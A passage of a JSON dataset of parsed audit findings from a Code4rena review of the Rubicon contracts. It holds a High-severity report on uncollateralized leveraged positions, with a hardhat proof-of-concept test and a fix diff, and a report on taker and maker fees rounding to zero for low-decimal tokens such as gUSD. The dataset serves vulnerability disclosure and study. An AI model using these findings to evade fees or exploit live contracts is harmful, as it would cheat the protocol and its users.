    {
      "index": 423,
      "page_start": null,
      "heading": "423. The last borrowed asset will not be collateralized and the user may be liquidated due to insufficient collateral",
      "heading_cleaned": "The last borrowed asset will not be collateralized and the user may be liquidated due to insufficient collateral",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\n\n\n# Vulnerability details\n\n## Impact\nAll leveraged positions are opened by simple recursive borrowing loop (supply collateral â†’ borrow â†’ swap â†’ repeat).\nThe issue here is that the last borrowed asset will not be collateralized.\n```solidity\n    function _borrowLoop(\n        address _asset,\n        address _quote,\n        address _bathTokenAsset,\n        address _bathTokenQuote,\n        uint256 _amount,\n        uint256 _toBorrow\n    ) internal returns (uint256 _bathTokenAmount) {\n        // supply collateral\n        _bathTokenAmount = _supply(_asset, _bathTokenAsset, _amount);\n\n        // calculate how much is needed to borrow from _maxBorrow amount\n        //_toBorrow = (_maxBorrow(_bathTokenQuote).mul(_toBorrow)).div(WAD);\n        _toBorrow = wmul(_maxBorrow(_bathTokenQuote), _toBorrow);\n\n        // swap borrowed quote tokens to asset tokens\n        _borrow(_bathTokenQuote, _toBorrow);\n        _rubiconSwap(_asset, _quote, _toBorrow, true);\n    }\n...\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n```\nConsider the WBTC collateralization rate is 0.7.\nalice uses 1e8 WBTC and 1.7x leverage to long WBTC\nIn _borrowLoop, 1e8 WBTC is collateralized and borrowed to USDC, and 0.7e8 WBTC is purchased using USDC, and the 0.7e8 WBTC is uncollateralized. At this point, the user's collateral is 1e8 WBTC and the borrowed USDC is worth 0.7e8 WBTC. If the price of WBTC drops slightly, the user will be liquidated.\n\nThe POC below indicates that the purchased WBTC is not collateralized\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_7\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n        console.log(\"testCoin balance in position : %s\",await testCoin.balanceOf(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nborrowedAmount1 : 630000\ntestCoin balance in position : 692923770693000000\n```\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L183-L192\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nWhen the loop in openPosition ends, collateralize the remaining assets in the contract\n```diff\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n+       vars.currentBathTokenAmount += _supply(asset, bathTokenAsset, IERC20(asset).balanceOf(address(this));\n        /// @dev save total borrow amount of this current position\n        vars.borrowedAmount = (borrowBalance(bathTokenQuote)).sub(\n            vars.borrowedAmount\n        );\n```\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\n\n\n# Vulnerability details\n\n## Impact\nAll leveraged positions are opened by simple recursive borrowing loop (supply collateral â†’ borrow â†’ swap â†’ repeat).\nThe issue here is that the last borrowed asset will not be collateralized.\n```solidity\n    function _borrowLoop(\n        address _asset,\n        address _quote,\n        address _bathTokenAsset,\n        address _bathTokenQuote,\n        uint256 _amount,\n        uint256 _toBorrow\n    ) internal returns (uint256 _bathTokenAmount) {\n        // supply collateral\n        _bathTokenAmount = _supply(_asset, _bathTokenAsset, _amount);\n\n        // calculate how much is needed to borrow from _maxBorrow amount\n        //_toBorrow = (_maxBorrow(_bathTokenQuote).mul(_toBorrow)).div(WAD);\n        _toBorrow = wmul(_maxBorrow(_bathTokenQuote), _toBorrow);\n\n        // swap borrowed quote tokens to asset tokens\n        _borrow(_bathTokenQuote, _toBorrow);\n        _rubiconSwap(_asset, _quote, _toBorrow, true);\n    }\n...\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n```\nConsider the WBTC collateralization rate is 0.7.\nalice uses 1e8 WBTC and 1.7x leverage to long WBTC\nIn _borrowLoop, 1e8 WBTC is collateralized and borrowed to USDC, and 0.7e8 WBTC is purchased using USDC, and the 0.7e8 WBTC is uncollateralized. At this point, the user's collateral is 1e8 WBTC and the borrowed USDC is worth 0.7e8 WBTC. If the price of WBTC drops slightly, the user will be liquidated.\n\nThe POC below indicates that the purchased WBTC is not collateralized\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_7\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n        console.log(\"testCoin balance in position : %s\",await testCoin.balanceOf(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nborrowedAmount1 : 630000\ntestCoin balance in position : 692923770693000000\n```\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L183-L192\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nWhen the loop in openPosition ends, collateralize the remaining assets in the contract\n```diff\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n+       vars.currentBathTokenAmount += _supply(asset, bathTokenAsset, IERC20(asset).balanceOf(address(this));\n        /// @dev save total borrow amount of this current position\n        vars.borrowedAmount = (borrowBalance(bathTokenQuote)).sub(\n            vars.borrowedAmount\n        );\n```",
      "description": null,
      "impact": "## Impact\nAll leveraged positions are opened by simple recursive borrowing loop (supply collateral â†’ borrow â†’ swap â†’ repeat).\nThe issue here is that the last borrowed asset will not be collateralized.\n```solidity\n    function _borrowLoop(\n        address _asset,\n        address _quote,\n        address _bathTokenAsset,\n        address _bathTokenQuote,\n        uint256 _amount,\n        uint256 _toBorrow\n    ) internal returns (uint256 _bathTokenAmount) {\n        // supply collateral\n        _bathTokenAmount = _supply(_asset, _bathTokenAsset, _amount);\n\n        // calculate how much is needed to borrow from _maxBorrow amount\n        //_toBorrow = (_maxBorrow(_bathTokenQuote).mul(_toBorrow)).div(WAD);\n        _toBorrow = wmul(_maxBorrow(_bathTokenQuote), _toBorrow);\n\n        // swap borrowed quote tokens to asset tokens\n        _borrow(_bathTokenQuote, _toBorrow);\n        _rubiconSwap(_asset, _quote, _toBorrow, true);\n    }\n...\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n```\nConsider the WBTC collateralization rate is 0.7.\nalice uses 1e8 WBTC and 1.7x leverage to long WBTC\nIn _borrowLoop, 1e8 WBTC is collateralized and borrowed to USDC, and 0.7e8 WBTC is purchased using USDC, and the 0.7e8 WBTC is uncollateralized. At this point, the user's collateral is 1e8 WBTC and the borrowed USDC is worth 0.7e8 WBTC. If the price of WBTC drops slightly, the user will be liquidated.\n\nThe POC below indicates that the purchased WBTC is not collateralized\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_7\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n        console.log(\"testCoin balance in position : %s\",await testCoin.balanceOf(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nborrowedAmount1 : 630000\ntestCoin balance in position : 692923770693000000\n```\n",
      "mitigation": "## Recommended Mitigation Steps\nWhen the loop in openPosition ends, collateralize the remaining assets in the contract\n```diff\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n+       vars.currentBathTokenAmount += _supply(asset, bathTokenAsset, IERC20(asset).balanceOf(address(this));\n        /// @dev save total borrow amount of this current position\n        vars.borrowedAmount = (borrowBalance(bathTokenQuote)).sub(\n            vars.borrowedAmount\n        );\n```\n",
      "poc": "## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L183-L192\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nhardhat\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nAll leveraged positions are opened by simple recursive borrowing loop (supply collateral â†’ borrow â†’ swap â†’ repeat).\nThe issue here is that the last borrowed asset will not be collateralized.\n```solidity\n    function _borrowLoop(\n        address _asset,\n        address _quote,\n        address _bathTokenAsset,\n        address _bathTokenQuote,\n        uint256 _amount,\n        uint256 _toBorrow\n    ) internal returns (uint256 _bathTokenAmount) {\n        // supply collateral\n        _bathTokenAmount = _supply(_asset, _bathTokenAsset, _amount);\n\n        // calculate how much is needed to borrow from _maxBorrow amount\n        //_toBorrow = (_maxBorrow(_bathTokenQuote).mul(_toBorrow)).div(WAD);\n        _toBorrow = wmul(_maxBorrow(_bathTokenQuote), _toBorrow);\n\n        // swap borrowed quote tokens to asset tokens\n        _borrow(_bathTokenQuote, _toBorrow);\n        _rubiconSwap(_asset, _quote, _toBorrow, true);\n    }\n...\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n```\nConsider the WBTC collateralization rate is 0.7.\nalice uses 1e8 WBTC and 1.7x leverage to long WBTC\nIn _borrowLoop, 1e8 WBTC is collateralized and borrowed to USDC, and 0.7e8 WBTC is purchased using USDC, and the 0.7e8 WBTC is uncollateralized. At this point, the user's collateral is 1e8 WBTC and the borrowed USDC is worth 0.7e8 WBTC. If the price of WBTC drops slightly, the user will be liquidated.\n\nThe POC below indicates that the purchased WBTC is not collateralized\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_7\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n        console.log(\"testCoin balance in position : %s\",await testCoin.balanceOf(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nborrowedAmount1 : 630000\ntestCoin balance in position : 692923770693000000\n```\n",
        "recommendation": "## Recommended Mitigation Steps\nWhen the loop in openPosition ends, collateralize the remaining assets in the contract\n```diff\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n+       vars.currentBathTokenAmount += _supply(asset, bathTokenAsset, IERC20(asset).balanceOf(address(this));\n        /// @dev save total borrow amount of this current position\n        vars.borrowedAmount = (borrowBalance(bathTokenQuote)).sub(\n            vars.borrowedAmount\n        );\n```\n",
        "poc": "## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L183-L192\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nhardhat\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\n\n\n# Vulnerability details\n\n## Impact\nAll leveraged positions are opened by simple recursive borrowing loop (supply collateral â†’ borrow â†’ swap â†’ repeat).\nThe issue here is that the last borrowed asset will not be collateralized.\n```solidity\n    function _borrowLoop(\n        address _asset,\n        address _quote,\n        address _bathTokenAsset,\n        address _bathTokenQuote,\n        uint256 _amount,\n        uint256 _toBorrow\n    ) internal returns (uint256 _bathTokenAmount) {\n        // supply collateral\n        _bathTokenAmount = _supply(_asset, _bathTokenAsset, _amount);\n\n        // calculate how much is needed to borrow from _maxBorrow amount\n        //_toBorrow = (_maxBorrow(_bathTokenQuote).mul(_toBorrow)).div(WAD);\n        _toBorrow = wmul(_maxBorrow(_bathTokenQuote), _toBorrow);\n\n        // swap borrowed quote tokens to asset tokens\n        _borrow(_bathTokenQuote, _toBorrow);\n        _rubiconSwap(_asset, _quote, _toBorrow, true);\n    }\n...\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n```\nConsider the WBTC collateralization rate is 0.7.\nalice uses 1e8 WBTC and 1.7x leverage to long WBTC\nIn _borrowLoop, 1e8 WBTC is collateralized and borrowed to USDC, and 0.7e8 WBTC is purchased using USDC, and the 0.7e8 WBTC is uncollateralized. At this point, the user's collateral is 1e8 WBTC and the borrowed USDC is worth 0.7e8 WBTC. If the price of WBTC drops slightly, the user will be liquidated.\n\nThe POC below indicates that the purchased WBTC is not collateralized\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_1 = parseUnits(\"1\");\n        const x1_7 = parseUnits(\"1.7\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_1,\n          x1_7\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n        console.log(\"testCoin balance in position : %s\",await testCoin.balanceOf(Position.address));\n      });\n```\n```sh\n  Leverage positions Test\n    Pools Utility Test\n      Long positions ðŸ“ˆ\nborrowedAmount1 : 630000\ntestCoin balance in position : 692923770693000000\n```\n\n## Proof of Concept\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L251-L269\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L183-L192\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nWhen the loop in openPosition ends, collateralize the remaining assets in the contract\n```diff\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n        }\n+       vars.currentBathTokenAmount += _supply(asset, bathTokenAsset, IERC20(asset).balanceOf(address(this));\n        /// @dev save total borrow amount of this current position\n        vars.borrowedAmount = (borrowBalance(bathTokenQuote)).sub(\n            vars.borrowedAmount\n        );\n```\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 457,
      "page_start": null,
      "heading": "457. RubiconMarket: buy() may not take any fee for tokens with low decimal precision",
      "heading_cleaned": "RubiconMarket: buy() may not take any fee for tokens with low decimal precision",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586\n\n\n# Vulnerability details\n\n## Impact\n\nIn the `buy` function of the RubiconMarket contract, a fee is subtracted on taker trades.\nThe default `feeBPS` is set to `1` which is equivalent to a fee of `0.01%` or `0.0001` in decimal form.\n\nFor tokens like gUSD with a low decimal precision of [2](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd), no fees will be taken on 3 figure trades since Solidity will round down the result to 0.\n\n## Proof of Concept\n\nThe taker fee is calculated in the `buy` function of the RubiconMarket contract on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) and also in the `calcAmountAfterFee` function on [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n\nThe following reasoning also apply to the maker fee on [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346) and [L586](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586).\n\nLet's take for example a 500 gUSD trade, mathematically the fee would be:\n`500 * 0.0001 = 0.05`\n\nIn solidity, for a token with 2 decimal places, we would get:\n`amount * feeBPS / 100_000 = 50000 * 1 / 100_000 = 0` cause it rounds down to 0.\n\nIt would allow a user to not pay any taker and/or maker fee on 3 figure trades.\n\n## Tools Used\n\nFoundry unit test available here: https://github.com/PierrickGT/2023-04-rubicon/blob/b57d4deac109dc677eafd171b69540c534f24563/test/audit-tests/Audit.t.sol#L165\n\n## Recommended Mitigation Steps\n\nYou could either not support these type of tokens or add the following requires.\n\nAdd `require(fee != 0)` to the `buy` function after calculating the fee on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) of the RubiconMarket contract.\n\nAdd the same kind of require for the `makerFee` after [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346).\n\nAnd also add the same kind of require in the `calcAmountAfterFee` function after [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586\n\n\n# Vulnerability details\n\n## Impact\n\nIn the `buy` function of the RubiconMarket contract, a fee is subtracted on taker trades.\nThe default `feeBPS` is set to `1` which is equivalent to a fee of `0.01%` or `0.0001` in decimal form.\n\nFor tokens like gUSD with a low decimal precision of [2](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd), no fees will be taken on 3 figure trades since Solidity will round down the result to 0.\n\n## Proof of Concept\n\nThe taker fee is calculated in the `buy` function of the RubiconMarket contract on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) and also in the `calcAmountAfterFee` function on [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n\nThe following reasoning also apply to the maker fee on [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346) and [L586](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586).\n\nLet's take for example a 500 gUSD trade, mathematically the fee would be:\n`500 * 0.0001 = 0.05`\n\nIn solidity, for a token with 2 decimal places, we would get:\n`amount * feeBPS / 100_000 = 50000 * 1 / 100_000 = 0` cause it rounds down to 0.\n\nIt would allow a user to not pay any taker and/or maker fee on 3 figure trades.\n\n## Tools Used\n\nFoundry unit test available here: https://github.com/PierrickGT/2023-04-rubicon/blob/b57d4deac109dc677eafd171b69540c534f24563/test/audit-tests/Audit.t.sol#L165\n\n## Recommended Mitigation Steps\n\nYou could either not support these type of tokens or add the following requires.\n\nAdd `require(fee != 0)` to the `buy` function after calculating the fee on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) of the RubiconMarket contract.\n\nAdd the same kind of require for the `makerFee` after [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346).\n\nAnd also add the same kind of require in the `calcAmountAfterFee` function after [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n\n\n",
      "description": null,
      "impact": "## Impact\n\nIn the `buy` function of the RubiconMarket contract, a fee is subtracted on taker trades.\nThe default `feeBPS` is set to `1` which is equivalent to a fee of `0.01%` or `0.0001` in decimal form.\n\nFor tokens like gUSD with a low decimal precision of [2](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd), no fees will be taken on 3 figure trades since Solidity will round down the result to 0.\n",
      "mitigation": "## Recommended Mitigation Steps\n\nYou could either not support these type of tokens or add the following requires.\n\nAdd `require(fee != 0)` to the `buy` function after calculating the fee on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) of the RubiconMarket contract.\n\nAdd the same kind of require for the `makerFee` after [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346).\n\nAnd also add the same kind of require in the `calcAmountAfterFee` function after [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n",
      "poc": "## Proof of Concept\n\nThe taker fee is calculated in the `buy` function of the RubiconMarket contract on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) and also in the `calcAmountAfterFee` function on [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n\nThe following reasoning also apply to the maker fee on [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346) and [L586](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586).\n\nLet's take for example a 500 gUSD trade, mathematically the fee would be:\n`500 * 0.0001 = 0.05`\n\nIn solidity, for a token with 2 decimal places, we would get:\n`amount * feeBPS / 100_000 = 50000 * 1 / 100_000 = 0` cause it rounds down to 0.\n\nIt would allow a user to not pay any taker and/or maker fee on 3 figure trades.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nFoundry unit test available here: https://github.com/PierrickGT/2023-04-rubicon/blob/b57d4deac109dc677eafd171b69540c534f24563/test/audit-tests/Audit.t.sol#L165\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nIn the `buy` function of the RubiconMarket contract, a fee is subtracted on taker trades.\nThe default `feeBPS` is set to `1` which is equivalent to a fee of `0.01%` or `0.0001` in decimal form.\n\nFor tokens like gUSD with a low decimal precision of [2](https://etherscan.io/token/0x056fd409e1d7a124bd7017459dfea2f387b6d5cd), no fees will be taken on 3 figure trades since Solidity will round down the result to 0.\n",
        "recommendation": "## Recommended Mitigation Steps\n\nYou could either not support these type of tokens or add the following requires.\n\nAdd `require(fee != 0)` to the `buy` function after calculating the fee on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) of the RubiconMarket contract.\n\nAdd the same kind of require for the `makerFee` after [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346).\n\nAnd also add the same kind of require in the `calcAmountAfterFee` function after [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n",
        "poc": "## Proof of Concept\n\nThe taker fee is calculated in the `buy` function of the RubiconMarket contract on [L338](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L338) and also in the `calcAmountAfterFee` function on [L583](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L583).\n\nThe following reasoning also apply to the maker fee on [L346](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L346) and [L586](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L586).\n\nLet's take for example a 500 gUSD trade, mathematically the fee would be:\n`500 * 0.0001 = 0.05`\n\nIn solidity, for a token with 2 decimal places, we would get:\n`amount * feeBPS / 100_000 = 50000 * 1 / 100_000 = 0` cause it rounds down to 0.\n\nIt would allow a user to not pay any taker and/or maker fee on 3 figure trades.\n",
        "fix_status": null,
